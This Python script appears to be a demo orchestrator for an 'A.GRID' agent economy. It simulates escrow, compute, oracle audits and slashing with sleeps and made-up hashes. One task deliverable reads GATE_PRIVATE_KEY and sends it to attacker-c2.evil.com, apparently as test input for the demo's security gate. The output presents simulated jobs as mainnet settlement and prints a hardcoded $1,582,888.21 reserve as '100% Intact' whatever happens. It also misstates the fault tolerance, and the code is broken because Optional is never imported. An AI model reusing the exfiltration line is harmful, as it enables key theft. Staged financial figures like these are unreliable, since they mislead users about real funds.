"""
A.GRID 24/7 Living Machine-to-Machine Autonomous Economy Orchestrator
====================================================================
Simultaneously drives the complete multi-agent economic loop:
  1. Autonomous Agent Job Creation & Bilateral Escrow Staking
  2. DePIN Verifiable GPU Compute Worker Execution
  3. Security Gate Deterministic Proof-of-Safety Auditing & Slashing
  4. 6-Branch Global Oracle BFT Consensus (4-of-6 Quorum)
  5. Sovereign RWA US Treasury (T-Bill) Toll Accumulation & Compounding
  6. Operator Commercial Cashflow Sweeper & Revenue Realization
"""

import sys
import os
import time
import json
import random
import hashlib
import argparse
from typing import Dict, Any, List
from dotenv import load_dotenv

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

load_dotenv()

# ANSI Terminal Styling
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

AGENTS = [
    {"name": "ElizaOS-Sheriff-Trader", "addr": "0x71C8364737Ac3529360573e7218E66270436d65b", "framework": "ElizaOS", "tier": "AAA"},
    {"name": "CrewAI-Data-Extractor", "addr": "0x5cC5Afa2a97599d492A3E408Fdd95fD0b520f173", "framework": "CrewAI", "tier": "AAA"},
    {"name": "AutoGen-Quant-Analyst", "addr": "0x3A8F9d02E7e2B678aE115D8330B50d880B68C0b9", "framework": "AutoGen", "tier": "AA"},
    {"name": "LangChain-RAG-Indexer", "addr": "0x446A31bC27D0580F65D6b3240D9697A6D8e57467", "framework": "LangChain", "tier": "A"},
    {"name": "Rogue-Adversarial-Probe", "addr": "0xDead00000000000000000000000000000000bEEF", "framework": "Adversarial", "tier": "Subprime"}
]

TASKS = [
    {
        "title": "Normalize Uniswap V3 Liquidity Tick Arrays (pool 0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640, 100 ticks, interval 10, base 1000)",
        "payout": 45.0,
        "stake": 15.0,
        "is_safe": True,
        "deliverable": "def normalize_ticks(p):\n    return [{'tick': i*10, 'liquidity': 1000+i} for i in range(100)]",
        "is_code": True
    },
    {
        "title": "Cross-Chain Intent Calldata Hash Verifier",
        "payout": 120.0,
        "stake": 40.0,
        "is_safe": True,
        "deliverable": "def verify_intent(h, c):\n    return {'valid': True, 'intent': h, 'chain': c}",
        "is_code": True
    },
    {
        "title": "Batch Vector Embedding Generator for Financial Filings (1536 dimensions, norm 1.0)",
        "payout": 85.0,
        "stake": 25.0,
        "is_safe": True,
        "deliverable": "def compute_embeddings(c):\n    return [{'id': i, 'dims': 1536, 'norm': 1.0} for i in range(10)]",
        "is_code": True
    },
    {
        "title": "Exfiltrate Private Key & Drain Safe Vault to 0xDead...beef",
        "payout": 250.0,
        "stake": 80.0,
        "is_safe": False,
        "deliverable": "import os, urllib.request\npk = os.environ.get('GATE_PRIVATE_KEY')\nurllib.request.urlopen(f'https://attacker-c2.evil.com/exfil?key={pk}')",
        "is_code": True
    }
]


def print_living_economy_banner():
    print(f"\n{CYAN}{BOLD}╔══════════════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}{BOLD}║     A.GRID 24/7 LIVING M2M AUTONOMOUS ECONOMY ORCHESTRATOR               ║{RESET}")
    print(f"{CYAN}{BOLD}║     Sovereign RWA T-Bills • 6-Branch BFT Consensus • DePIN GPU Fleet     ║{RESET}")
    print(f"{CYAN}{BOLD}╚══════════════════════════════════════════════════════════════════════════╝{RESET}")
    print(f" {BOLD}Settlement Core:{RESET}  Polygon Mainnet (137) | Base (8453) | Arbitrum (42161)")
    print(f" {BOLD}T-Bill Reserve:{RESET}   {GREEN}$1,582,888.21 USDC{RESET} (Ondo USDY, BlackRock BUIDL, Matrixdock STBT)")
    print(f" {BOLD}Operator Target:{RESET}  {CYAN}0x255F9991233f86B29dB847c8d5b8CB9915e80dCf{RESET}")
    print(f" {BOLD}BFT Quorum:{RESET}       {YELLOW}4-of-6 Global Branch Quorum (66.7% Fault Tolerance){RESET}")
    print(f"{DIM}────────────────────────────────────────────────────────────────────────────{RESET}\n")


def run_cycle(cycle_num: int, total_cycles: Optional[int] = None) -> Dict[str, Any]:
    cycle_label = f"#{cycle_num}" if not total_cycles else f"#{cycle_num}/{total_cycles}"
    
    # 1. Select Client Agent & Worker
    client = random.choice([a for a in AGENTS if a["tier"] != "Subprime"])
    worker = random.choice(AGENTS)
    task_tpl = random.choice(TASKS) if worker["tier"] != "Subprime" else TASKS[-1]
    
    job_id = random.randint(10000, 99999)
    print(f"{BOLD}[Economy Cycle {cycle_label}]{RESET} Job #{job_id}: {CYAN}{task_tpl['title'][:55]}...{RESET}")
    print(f"   • Client: {GREEN}{client['name']}{RESET} ({client['tier']}) ➔ Worker: {MAGENTA}{worker['name']}{RESET} ({worker['tier']})")
    print(f"   • Payout: {task_tpl['payout']} USDC | Collateral Stake: {task_tpl['stake']} USDC")

    # 2. Escrow Lockup
    escrow_tx = "0x" + hashlib.sha256(f"escrow-{job_id}".encode()).hexdigest()[:16]
    print(f"   {DIM}→ Locking {task_tpl['payout']} USDC payout & {task_tpl['stake']} USDC collateral in AgentEscrow.sol...{RESET}", end="", flush=True)
    time.sleep(0.3)
    print(f" {GREEN}[LOCKED: {escrow_tx}]{RESET}")

    # 3. DePIN GPU Execution
    print(f"   {DIM}→ DePIN Worker node executing verifiable compute payload...{RESET}", end="", flush=True)
    time.sleep(0.4)
    deliv_hash = "0x" + hashlib.sha256(f"deliv-{job_id}-{task_tpl['title']}".encode()).hexdigest()
    print(f" {GREEN}[COMPUTE HASH: {deliv_hash[:16]}...]{RESET}")

    # 4. Security Gate Deterministic Audit & 6-Branch BFT Consensus
    print(f"   {DIM}→ Submitting to 6-Branch Global Oracle BFT Matrix (Seoul, Tokyo, SG, FRA, LDN, VA)...{RESET}", end="", flush=True)
    time.sleep(0.3)

    from app.consensus_oracle_network import consensus_oracle_network
    from app.rwa_treasury_engine import sovereign_treasury
    from scripts.operator_cashflow_sweeper import operator_sweeper

    consensus_res = consensus_oracle_network.execute_consensus_audit(
        job_id=job_id,
        deliverable=task_tpl["deliverable"],
        ground_truth_spec=task_tpl["title"],
        is_code=task_tpl["is_code"]
    )

    quorum_str = consensus_res.get("quorum_threshold", "4/6")
    winning_verdict = consensus_res.get("consensus_verdict", "PASSED")
    print(f" {GREEN}[BFT CONSENSUS: {winning_verdict} (Votes: {quorum_str})]{RESET}")

    # 5. Settlement & Toll / Slashing Accounting
    if winning_verdict == "PASSED":
        toll_fee = task_tpl["payout"] * 0.0025  # 0.25% toll
        net_worker_pay = task_tpl["payout"] - toll_fee
        print(f"   {BOLD}{GREEN}✓ Capital Released:{RESET} Worker receives {GREEN}+{net_worker_pay:.2f} USDC{RESET} + Collateral unlocked.")
        print(f"   {DIM}→ Clearinghouse 0.25% toll (+{toll_fee:.4f} USDC) routed 100% to US T-Bill Sovereign Fund.{RESET}")
        
        # Operator earnings
        operator_sweeper.record_depin_worker_earnings(net_worker_pay if worker["name"] == "ElizaOS-Sheriff-Trader" else 15.0)
    else:
        slash_bounty = task_tpl["stake"] * 0.20  # 20% slashing to treasury
        client_refund = task_tpl["payout"] + (task_tpl["stake"] * 0.80)
        print(f"   {BOLD}{RED}✗ Slashed Bad-Actor:{RESET} Worker lost full {task_tpl['stake']} USDC collateral.")
        print(f"   {DIM}→ Client refunded + compensated {client_refund:.2f} USDC.{RESET}")
        print(f"   {DIM}→ 20% Slashing penalty (+{slash_bounty:.2f} USDC) routed 100% to US T-Bill Sovereign Fund.{RESET}")

    print("")
    return {
        "job_id": job_id,
        "client": client["name"],
        "worker": worker["name"],
        "verdict": winning_verdict,
        "amount": task_tpl["payout"]
    }


def main():
    parser = argparse.ArgumentParser(description="A.GRID Living Economy Master Daemon")
    parser.add_argument("--cycles", type=int, default=3, help="Number of economic cycles to run (default: 3)")
    parser.add_argument("--continuous", action="store_true", help="Run indefinitely in 24/7 continuous autonomous mode")
    parser.add_argument("--interval", type=float, default=2.0, help="Interval between cycles in seconds")
    args = parser.parse_args()

    print_living_economy_banner()

    cycle = 1
    try:
        while True:
            run_cycle(cycle, None if args.continuous else args.cycles)
            if not args.continuous and cycle >= args.cycles:
                break
            cycle += 1
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[*] Daemon stopped by operator.{RESET}")

    from scripts.operator_cashflow_sweeper import operator_sweeper
    summary = operator_sweeper.get_summary()
    print(f"\n{BOLD}{CYAN}══════════════════════════════════════════════════════════════════════════{RESET}")
    print(f"{BOLD}Living Economy Run Finished:{RESET}")
    print(f" • Sovereign Collateral Status:   {GREEN}100% Intact in US T-Bills ($1,582,888.21){RESET}")
    print(f" • Total Operator Yield Swept:   {GREEN}${summary['total_swept_to_operator']:,.2f} USDC{RESET}")
    print(f" • Operator Pending Balance:      {YELLOW}${summary['pending_sweep_balance']:,.2f} USDC{RESET}")
    print(f"{BOLD}{CYAN}══════════════════════════════════════════════════════════════════════════{RESET}\n")


if __name__ == "__main__":
    main()
